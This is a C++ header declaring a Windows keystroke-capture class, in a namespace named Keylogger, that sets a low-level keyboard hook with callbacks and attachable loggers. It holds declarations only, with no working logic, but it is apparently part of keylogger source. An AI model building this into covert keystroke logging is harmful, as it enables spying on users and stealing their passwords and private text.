#ifndef KEYSTROKE_CAPTURER_WINDOWS_H
#define KEYSTROKE_CAPTURER_WINDOWS_H

#ifdef _WIN32

#include "IKeystrokeCapturer.h"
#include "ILogger.h"

#include <functional>
#include <vector>
#include <windows.h>

namespace Keylogger {

class KeystrokeCapturerWindows : public IKeystrokeCapturer {
 public:
    bool start();
    void stop();

    void consumeKeystrokes(bool consume);
    void setCallback(std::function<void (int keycode, KeyState state)> callback);
    void addLogger(ILogger* logger);

 private:
    //find a way to make these not static
    static std::vector<ILogger*> _loggers;
    static bool _consumeKeystrokes;
    static std::function<void(int keycode, KeyState state)> _callback;
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    HHOOK _keyboardHook;
};

}

#endif // defined(_WIN32)

#endif // KEYSTROKE_CAPTURER_WINDOWS_H
